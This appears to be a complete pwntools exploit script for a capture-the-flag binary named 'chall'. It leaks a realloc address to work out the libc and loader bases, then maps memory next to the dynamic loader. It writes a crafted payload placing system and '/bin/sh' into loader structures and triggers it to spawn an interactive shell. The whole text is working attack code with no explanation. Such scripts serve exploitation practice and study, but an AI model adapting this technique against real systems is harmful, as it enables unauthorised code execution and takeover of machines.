from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./chall')
libc = elf.libc

p = remote('localhost', 5941)
p = elf.process()
#gdb.attach(p)


def mmap(addr, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b": ", str(addr).encode())
    p.sendlineafter(b": ", str(size).encode())

def munmap():
    p.sendlineafter(b"> ", b"2")

def store(offset, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b": ", str(offset).encode())
    p.sendlineafter(b": ", data)

def load(offset):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b": ", str(offset).encode())

mmap(0, 0x1000)
mmap(0, 0x3000)

load(0x2a58)

realloc = unpack(p.recvn(6),'all')
info(f"{hex(realloc) = }")
p.recvuntil(b"1. mmap")

libc.address = realloc - libc.sym.realloc
ld_base = libc.address + 0x230000
info(f"{hex(libc.address) = }")
info(f"{hex(ld_base) = }")

munmap()

mmap(ld_base + 0x39000, 0x3000)
mmap(0, 0x4000)

payload = b"\x00" * 0xa50
payload += p64(0)
payload += p64(0xdeadbeef0000)
payload += p64(0xdeadbeef0010)
payload += p64(0xdeadbeef0020)
payload += p64(0xdeadbeef0030)
payload += p64(0xdeadbeef0040)
payload += p64(libc.sym.system)
payload += b"\x00" * (0xae0 - len(payload))
payload += p64(0x0006050d00000000)
payload += p64(0xcafebabe0000)
payload += p64(7)
payload += p64(0x1000)
payload += p64(0x7f0)
payload += p64(0)
payload += p64(0xfee1dead0000)
payload += b"\x00" * (0x1a40 - len(payload))
payload += p64(1)
payload += b"/bin/sh\0"

store(0x2000, payload)

p.sendlineafter(b"> ", b"5")

p.interactive()
